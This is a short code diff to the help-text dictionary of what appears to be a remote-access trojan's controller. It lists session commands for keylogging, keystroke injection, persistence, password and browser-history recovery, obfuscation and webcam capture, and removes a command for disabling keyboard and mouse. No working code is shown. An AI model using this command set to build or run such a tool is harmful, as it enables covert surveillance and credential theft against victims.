@@ -116,18 +116,13 @@ help_obj = {
   },
   'keylogger': {
     'type': 'Session',
-    'usage': 'keylogger --run | --download | --close | --status (--quiet)',
+    'usage': 'keylogger --run | --download (--quiet) | --close | --status',
     'description': 'Handle keylogger'
   },
   'keystroke': {
     'type': 'Session',
     'usage': 'keystroke --inject [inject] | --script [filename]',
     'description': 'Enumerate keyboard / mouse actions'
-  },
-  'disable': {
-    'type': 'Session',
-    'usage': 'disable (--unlock)',
-    'description': 'Disables / enables keyboard & mouse'
   },
   'persistence': {
     'type': 'Session',
@@ -141,7 +136,7 @@ help_obj = {
   },
   'recover': {
     'type': 'Session',
-    'usage': 'recover --password | --history (--quiet) (--force)',
+    'usage': 'recover --password | --history (--force) (--quiet)',
     'description': 'Recover passwords / browser history'
   },
   'obfuscate': {
@@ -166,7 +161,7 @@ help_obj = {
   },
   'cam_2': {
     'type': 'Session',
-    'usage': 'cam --resolution [resolution] (monitor [index]) (--fps) (--fit) (--ip [ip] & --port [port]) (--recognize [haarcascade])',
+    'usage': 'cam --resolution [resolution] (--monitor [index]) (--fps) (--fit) (--ip [ip] & --port [port]) (--recognize [haarcascade])',
     'description': 'Run cam module'
   },
   'audio_2': {
